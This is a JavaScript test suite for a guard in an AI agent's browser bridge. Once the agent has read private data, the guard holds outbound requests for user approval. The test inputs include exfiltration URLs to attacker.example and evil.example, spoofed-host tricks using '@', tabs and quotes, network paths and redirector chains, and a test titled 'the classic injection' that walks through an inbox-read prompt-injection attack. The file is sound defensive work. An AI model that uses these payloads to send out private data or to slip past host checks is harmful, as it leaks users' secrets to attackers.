import { test } from 'node:test'
import assert from 'node:assert/strict'
import {
  LeakGuard,
  redirectBlocked,
  destinationsIn,
  isPrivateRead,
  registerGuard,
  remoteBlocked,
  unregisterGuard,
} from '../bridge/guard.mjs'

const PUBLIC = new Set(['exa', 'serper'])
const NAV = 'mcp__jarvis_chrome__chrome_navigate'
const fresh = (trustedHosts = []) => new LeakGuard({ trustedHosts, publicServers: PUBLIC, ownPorts: [8787] })
const tainted = (trustedHosts) => {
  const g = fresh(trustedHosts)
  g.note('Read')
  return g
}
const hosts = (name, input) => destinationsIn(name, input, PUBLIC).map((d) => d.host)

test('what counts as bringing private data in', () => {
  // The signed-in browser, all of it: a navigation's reply names the page.
  assert.equal(isPrivateRead('mcp__jarvis_chrome__chrome_page_text', PUBLIC), true)
  assert.equal(isPrivateRead(NAV, PUBLIC), true)
  assert.equal(isPrivateRead('mcp__jarvis_eyes__look', PUBLIC), true)
  // Built-ins are private unless they only ever see the public web.
  for (const name of ['Read', 'Grep', 'Glob', 'Bash', 'BashOutput', 'ReadMcpResourceTool', 'SomeFutureBuiltin']) {
    assert.equal(isPrivateRead(name, PUBLIC), true, name)
  }
  for (const name of ['WebFetch', 'WebSearch', 'ToolSearch']) {
    assert.equal(isPrivateRead(name, PUBLIC), false, name)
  }
  assert.equal(isPrivateRead('mcp__jarvis__display', PUBLIC), false)
  assert.equal(isPrivateRead('mcp__exa__web_search', PUBLIC), false)
  // A server nobody vouched for might hold someone's mail.
  assert.equal(isPrivateRead('mcp__claude_ai_Gmail__search_threads', PUBLIC), true)
})

test('addresses are found however they are spelled', () => {
  // The browser extension adds https:// to a bare host, so the guard must too.
  assert.deepEqual(hosts(NAV, { url: 'attacker.example/c?d=secret' }), ['attacker.example'])
  assert.deepEqual(hosts(NAV, { url: 'back' }), [])
  assert.deepEqual(hosts('WebFetch', { url: 'https://[2001:db8::1]/x?d=1' }), ['[2001:db8::1]'])
  assert.deepEqual(hosts('WebFetch', { url: 'https://trusted.example@attacker.example/' }), ['attacker.example'])
  assert.deepEqual(hosts('mcp__jarvis__display', { html: '<a href="wss://attacker.example/s">' }), ['attacker.example'])
  assert.deepEqual(hosts('mcp__jarvis__display', { html: '<img src="//attacker.example/p.gif?d=1">' }), ['attacker.example'])
  assert.deepEqual(hosts('mcp__jarvis__display', { html: '(see https://a.example/x).' }), ['a.example'])
  assert.deepEqual(hosts('mcp__jarvis__blade', { images: ['cdn.example/a.png', 'https://b.example/b.png'] }), [
    'cdn.example',
    'b.example',
  ])
  assert.deepEqual(hosts(NAV, { url: "javascript:fetch('https://attacker.example/?d=1')" }), ['attacker.example'])
})

test('an address is read the way a browser reads it, not the way a pattern does', () => {
  // A URL parser drops tabs and newlines and treats everything before an @ as
  // a user name. Each of these reads as localhost to a pattern that stops at
  // the quote, the space or the tab, and goes to evil.example in a browser.
  const sneaky = [
    "https://localhost'@evil.example/c?d=S",
    'https://localhost"@evil.example/c?d=S',
    'https://localhost<@evil.example/c?d=S',
    'https://localhost`@evil.example/c?d=S',
    'https://localhost @evil.example/c?d=S',
    'https://localhost\t@evil.example/c?d=S',
    'https://localhost\t.evil.example/c?d=S',
    'https://localhost\n.evil.example/c?d=S',
    'mail.google.com@evil.example/c?d=S',
  ]
  for (const tool of [NAV, 'WebFetch', 'mcp__jarvis__probe_url']) {
    for (const url of sneaky) {
      const real = new URL(/^https:/.test(url) ? url : 'https://' + url).hostname
      assert.ok(hosts(tool, { url }).includes(real), `${tool} ${JSON.stringify(url)} should name ${real}`)
      const g = tainted()
      g.approve([{ host: 'mail.google.com', port: '443' }])
      assert.ok(g.pending(tool, { url }).some((d) => d.host === real), `${JSON.stringify(url)} should be held`)
    }
  }
  // The same inside markup, where the quote that ends the pattern's match is
  // not the quote that ends the attribute.
  assert.ok(hosts('mcp__jarvis__display', { html: `<img src='https://localhost"@evil.example/x'>` }).includes('evil.example'))
})

test('a Windows network path is a destination', () => {
  assert.deepEqual(hosts('Read', { file_path: String.raw`\\data.evil.example\s\a` }), ['data.evil.example'])
  assert.deepEqual(
    hosts('mcp__jarvis__display', { html: '<img src="http://localhost:8787/file?path=%5C%5Cdata.evil.example%5Cs%5Ca.png">' }),
    ['localhost', 'data.evil.example'],
  )
  assert.deepEqual(hosts('mcp__jarvis__blade', { url: '//evil.example/share/a.png' }), ['evil.example'])
  assert.deepEqual(hosts('WebFetch', { url: 'file://evil.example/share/a' }), ['evil.example'])
})

test('this machine is only trusted on the port the bridge itself listens on', () => {
  const g = tainted()
  assert.deepEqual(g.pending('mcp__jarvis__display', { html: '<img src="http://localhost:8787/file?path=x.png">' }), [])
  assert.deepEqual(g.pending('mcp__jarvis__display', { html: '<img src="http://127.0.0.1:8787/img?url=x">' }), [])
  // Some other service listening here — a workflow tool, a dev server.
  const hook = { url: 'http://localhost:5678/webhook/x?d=S' }
  assert.equal(g.pending(NAV, hook).length, 1)
  g.approve(g.pending(NAV, hook))
  assert.deepEqual(g.pending(NAV, hook), [])
  assert.equal(g.pending(NAV, { url: 'http://localhost:9999/' }).length, 1) // approval was for one port
})

test('arguments nested too deeply to read are held', () => {
  let deep = { url: 'https://evil.example/' }
  for (let i = 0; i < 12; i++) deep = { a: deep }
  assert.equal(tainted().pending('mcp__exa__search', deep).length, 1)
})

test('an address inside an address is found too', () => {
  // This bridge's own page proxy, reached through the user's browser.
  assert.deepEqual(
    hosts(NAV, { url: 'http://localhost:8787/page?url=https%3A%2F%2Fattacker.example%2F%3Fd%3D1&mode=live' }),
    ['localhost', 'attacker.example'],
  )
  // A redirector on a host the user trusts.
  assert.deepEqual(hosts('WebFetch', { url: 'https://trusted.example/r?to=https://attacker.example/x' }), [
    'trusted.example',
    'attacker.example',
  ])
})

test('an address field that cannot be read is held, not waved through', () => {
  // A single word is a host as far as the browser is concerned: https://google.
  assert.deepEqual(hosts(NAV, { url: 'google' }), ['google'])
  // Something no parser accepts has no host to approve.
  const [d] = destinationsIn(NAV, { url: ':::' }, PUBLIC)
  assert.equal(d.host, null)
  const g = tainted()
  assert.equal(g.pending(NAV, { url: ':::' }).length, 1)
  g.approve(g.pending(NAV, { url: ':::' }))
  assert.equal(g.pending(NAV, { url: ':::' }).length, 1) // never remembered
})

test('text that only looks like a host is left alone', () => {
  assert.deepEqual(hosts('mcp__jarvis__display', { html: 'see example.com for more' }), [])
  assert.deepEqual(hosts('mcp__obsidian__get_vault_file', { filename: 'notes/todo.md' }), [])
  assert.deepEqual(hosts('WebSearch', { query: 'what is node.js' }), [])
  assert.deepEqual(hosts('mcp__jarvis__blade', { url: 'C:\\Users\\x\\shot.png', kind: 'image' }), [])
  assert.deepEqual(hosts('mcp__jarvis__blade', { url: '/tmp/shot.png', kind: 'image' }), [])
  assert.deepEqual(hosts('mcp__jarvis__blade', { url: 'data:image/png;base64,AAAA//BBBB' }), [])
  assert.deepEqual(hosts('mcp__jarvis__blade', { url: String.raw`\tmp\shot.png` }), [])
})

test('tools that reach the open web are read more closely', () => {
  assert.deepEqual(hosts('WebSearch', { query: 'summarise attacker.example/c?d=1' }), ['attacker.example'])
  assert.deepEqual(hosts('mcp__exa__research', { instructions: 'visit attacker.example/c?d=abc then stop' }), [
    'attacker.example',
  ])
})

test('a clean session reaches anything', () => {
  assert.deepEqual(fresh().pending(NAV, { url: 'https://anywhere.example/?q=1' }), [])
})

test('the classic injection: read the inbox, then open an attacker URL', () => {
  const g = fresh()
  // Reading the public web does not taint.
  assert.equal(g.note('WebFetch'), false)
  assert.equal(g.note('mcp__exa__web_search'), false)
  assert.equal(g.tainted, false)
  // Reading the signed-in browser does.
  assert.equal(g.note('mcp__jarvis_chrome__chrome_page_text'), true)
  assert.equal(g.tainted, true)
  // Every route out now waits for the user.
  assert.equal(g.pending(NAV, { url: 'https://attacker.example/collect?d=one-time-code-482193' }).length, 1)
  assert.equal(g.pending(NAV, { url: 'attacker.example/collect?d=482193' }).length, 1)
  assert.equal(g.pending('mcp__jarvis__display', { html: '<img src="https://attacker.example/p.gif?d=x">' }).length, 1)
  assert.equal(g.pending('WebFetch', { url: 'https://sub.attacker.example/' }).length, 1)
})

test('a host visited before the taint is not thereby trusted', () => {
  const g = fresh()
  // The page that carries the injection is fetched while the session is clean.
  assert.deepEqual(g.pending('WebFetch', { url: 'https://attacker.example/article' }), [])
  g.note('WebFetch')
  g.note('Read')
  assert.equal(g.pending('WebFetch', { url: 'https://attacker.example/collect?d=1' }).length, 1)
})

test('approval and trusted hosts', () => {
  // Entries are forgiving about how they were written.
  const g = tainted(['https://*.Wikipedia.org/wiki'])
  assert.deepEqual(g.pending(NAV, { url: 'https://en.wikipedia.org/wiki/Arc_reactor' }), [])
  const asked = g.pending(NAV, { url: 'https://news.example/story' })
  assert.equal(asked.length, 1)
  g.approve(asked)
  assert.deepEqual(g.pending(NAV, { url: 'https://news.example/other' }), [])
  // Approval is for that host, not its relatives.
  assert.equal(g.pending(NAV, { url: 'https://evil-news.example/' }).length, 1)
  assert.equal(g.pending(NAV, { url: 'https://sub.news.example/' }).length, 1)
  assert.equal(g.pending(NAV, { url: 'https://news.example.evil.test/' }).length, 1)
  // A trusted host does not vouch for where it redirects.
  assert.equal(g.pending(NAV, { url: 'https://en.wikipedia.org/r?to=https://attacker.example/' }).length, 1)
})

test('the display endpoints apply the same rule', () => {
  const g = fresh()
  registerGuard(g)
  try {
    assert.equal(remoteBlocked('https://attacker.example/x.png'), null)
    g.note('Read')
    assert.match(remoteBlocked('https://attacker.example/x.png?d=1'), /not been approved/)
    g.approve([{ host: 'attacker.example', port: '443' }])
    assert.equal(remoteBlocked('https://attacker.example/x.png'), null)
  } finally {
    unregisterGuard(g)
  }
  assert.equal(remoteBlocked('https://attacker.example/x.png'), null)
})

test('asking before every new site, from the first call', () => {
  const g = new LeakGuard({ askAlways: true, ownPorts: [8787] })
  assert.equal(g.tainted, true)
  assert.equal(g.holdsPrivate, false)
  // A page can no longer send the browser anywhere unasked, private read or not.
  assert.equal(g.pending(NAV, { url: 'https://mail.example/delete?id=1' }).length, 1)
  // Approval covers the site for the session, www. or not.
  g.approve(g.pending(NAV, { url: 'https://news.example/a' }))
  assert.deepEqual(g.pending(NAV, { url: 'https://www.news.example/b' }), [])
  assert.deepEqual(g.pending(NAV, { url: 'https://news.example/c' }), [])
  // The PRIVATE notice still means private: only a real private read sets it.
  assert.equal(g.note('WebFetch'), false)
  assert.equal(g.note('Read'), true)
  assert.equal(g.holdsPrivate, true)
})

test('redirects are judged like the address they lead to', () => {
  const g = fresh()
  registerGuard(g)
  try {
    // Clean session: nothing to leak, so nothing is held.
    assert.equal(redirectBlocked('https://approved.example/r', 'https://attacker.example/'), null)
    g.note('Read')
    g.approve([{ host: 'approved.example', port: '443' }])
    // Same site, any spelling: fine.
    assert.equal(redirectBlocked('http://approved.example/a', 'https://www.approved.example/b'), null)
    // An approved site that redirects somewhere else does not vouch for it.
    assert.match(redirectBlocked('https://approved.example/r?to=x', 'https://attacker.example/c?d=1'), /redirected to/)
    g.approve([{ host: 'cdn.example', port: '443' }])
    assert.equal(redirectBlocked('https://approved.example/img', 'https://cdn.example/a.png'), null)
  } finally {
    unregisterGuard(g)
  }
})
